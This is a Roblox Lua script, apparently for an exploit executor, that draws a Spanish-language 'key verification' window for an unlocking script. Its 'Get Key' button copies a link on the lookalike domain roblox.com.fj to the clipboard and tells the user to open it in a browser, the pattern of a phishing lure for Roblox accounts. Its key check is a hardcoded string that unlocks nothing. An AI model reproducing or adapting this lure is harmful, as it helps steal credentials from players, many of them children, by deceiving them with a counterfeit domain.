-- Variables
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local keyLink = "https://roblox.com.fj/communities/4137931293/"

-- Creación de la GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ScriptsKeyGUI"
screenGui.Parent = CoreGui
screenGui.Enabled = true -- Asegura que la ScreenGui esté habilitada

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 200)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
mainFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.new(0.2, 0.2, 0.2)
mainFrame.Draggable = true
mainFrame.Parent = screenGui
mainFrame.Visible = true -- Asegura que el Frame sea visible

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 10)
frameCorner.Parent = mainFrame

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Name = "UIListLayout"
uiListLayout.Parent = mainFrame
uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
uiListLayout.Padding = UDim.new(0, 5)
uiListLayout.FillDirection = Enum.FillDirection.TopToBottom

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextScaled = true
titleLabel.Text = "Verificación de Clave"
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Parent = mainFrame

local descriptionLabel = Instance.new("TextLabel")
descriptionLabel.Name = "DescriptionLabel"
descriptionLabel.Size = UDim2.new(1, -20, 0, 40)
descriptionLabel.BackgroundTransparency = 1
descriptionLabel.TextColor3 = Color3.new(1, 1, 1)
descriptionLabel.TextScaled = true
descriptionLabel.Text = "Dale a 'Get Key' para copiar nuestro enlace de grupo de Roblox y entra para obtener la clave."
descriptionLabel.Font = Enum.Font.SourceSans
descriptionLabel.TextWrapped = true
descriptionLabel.Parent = mainFrame

local keyTextBox = Instance.new("TextBox")
keyTextBox.Name = "KeyTextBox"
keyTextBox.Size = UDim2.new(0.9, 0, 0, 30)
keyTextBox.PlaceholderText = "Introduce la clave aquí..."
keyTextBox.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
keyTextBox.BorderSizePixel = 1
keyTextBox.BorderColor3 = Color3.new(0.4, 0.4, 0.4)
keyTextBox.TextColor3 = Color3.new(1, 1, 1)
keyTextBox.TextScaled = true
keyTextBox.Parent = mainFrame

local buttonFrame = Instance.new("Frame")
buttonFrame.Name = "ButtonFrame"
buttonFrame.Size = UDim2.new(1, 0, 0, 35)
buttonFrame.BackgroundTransparency = 1
buttonFrame.Parent = mainFrame

local buttonListLayout = Instance.new("UIListLayout")
buttonListLayout.Name = "UIListLayout"
buttonListLayout.Parent = buttonFrame
buttonListLayout.FillDirection = Enum.FillDirection.Horizontal
buttonListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
buttonListLayout.Padding = UDim.new(0, 10)

local getKeyButton = Instance.new("TextButton")
getKeyButton.Name = "GetKeyButton"
getKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
getKeyButton.BackgroundColor3 = Color3.new(0.2, 0.6, 0.8)
getKeyButton.TextColor3 = Color3.new(1, 1, 1)
getKeyButton.Text = "Get Key"
getKeyButton.Font = Enum.Font.SourceSansBold
getKeyButton.Parent = buttonFrame

local checkKeyButton = Instance.new("TextButton")
checkKeyButton.Name = "CheckKeyButton"
checkKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
checkKeyButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.6)
checkKeyButton.TextColor3 = Color3.new(1, 1, 1)
checkKeyButton.Text = "Check Key"
checkKeyButton.Font = Enum.Font.SourceSansBold
checkKeyButton.Parent = buttonFrame

-- Manejo de Eventos
getKeyButton.MouseButton1Click:Connect(function()
    local success, err = pcall(function()
        setclipboard(keyLink)
    end)
    if success then
        keyTextBox.PlaceholderText = "¡Enlace copiado! Pégalo en tu navegador."
        task.wait(2)
        keyTextBox.PlaceholderText = "Introduce la clave aquí..."
    else
        warn("Error al copiar al portapapeles:", err)
        keyTextBox.PlaceholderText = "Error al copiar. Revisa la consola."
        task.wait(2)
        keyTextBox.PlaceholderText = "Introduce la clave aquí..."
    end
end)

checkKeyButton.MouseButton1Click:Connect(function()
    local enteredKey = keyTextBox.Text
    if string.len(enteredKey) > 0 then
        if enteredKey == "mi_clave_secreta_123" then
            keyTextBox.PlaceholderText = "¡Clave válida! Script desbloqueado."
        else
            keyTextBox.PlaceholderText = "Clave incorrecta. Inténtalo de nuevo."
        end
    else
        keyTextBox.PlaceholderText = "Por favor, introduce una clave."
    end
    task.wait(2)
    keyTextBox.PlaceholderText = "Introduce la clave aquí..."
end)
